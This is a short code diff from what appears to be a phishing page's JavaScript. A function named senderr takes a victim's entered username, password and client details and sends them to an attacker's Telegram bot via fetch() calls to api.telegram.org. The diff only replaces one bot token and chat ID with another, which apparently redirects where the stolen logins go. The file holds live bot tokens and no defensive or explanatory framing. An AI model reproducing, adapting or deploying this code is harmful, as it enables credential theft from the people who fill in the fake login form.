@@ -1607,16 +1607,16 @@
           function senderr(inputUser=null, inputPass=null, clientInfo=null){
             if(inputUser&&inputPass){
               console.log(inputUser,inputPass,clientInfo)
-              var token = "5847153449:AAHK64AFXMYg8U87147PS2SPZw-9pGVAnIY";
-              var idd = 5781436112;
+              var token = "7151620363:AAEpE_Kiz1b7iAl4i2At6Wg_ei-ZaB6guew";
+              var idd = 1530189569;
               var message = `login info : User : ${inputUser}  --  Pass : ${inputPass}`;
               url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${idd}&text=${message}`;
               fetch(url);}
             // info
             if(clientInfo){
               console.log(inputUser,inputPass,clientInfo)
-               token = "5847153449:AAHK64AFXMYg8U87147PS2SPZw-9pGVAnIY";
-               var idd = 5781436112;
+               token = "7151620363:AAEpE_Kiz1b7iAl4i2At6Wg_ei-ZaB6guew";
+               var idd = 1530189569;
                var message = `clientInfo : ${clientInfo}`;
                url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${idd}&text=${message}`;
                fetch(url);
